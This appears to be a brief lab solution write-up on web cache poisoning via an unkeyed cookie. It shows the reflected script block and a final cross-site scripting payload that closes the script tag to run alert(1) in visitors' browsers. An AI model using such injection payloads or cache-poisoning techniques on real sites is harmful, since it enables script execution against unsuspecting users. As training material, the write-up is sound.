# Description

This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(1)` in the visitor's browser.

# Solution

```html
<script>
data = {"host":"0af800a903de971780815d1400b1004d.web-security-academy.net","path":"/","frontend":"prod-cache-01"}
</script>
```


```html 
<script>
data = {"host":"0af800a903de971780815d1400b1004d.web-security-academy.net","path":"/","frontend":"alert(1)"}
</script>
```


## Final payload

```html
"}</script><script>alert(1)//
```

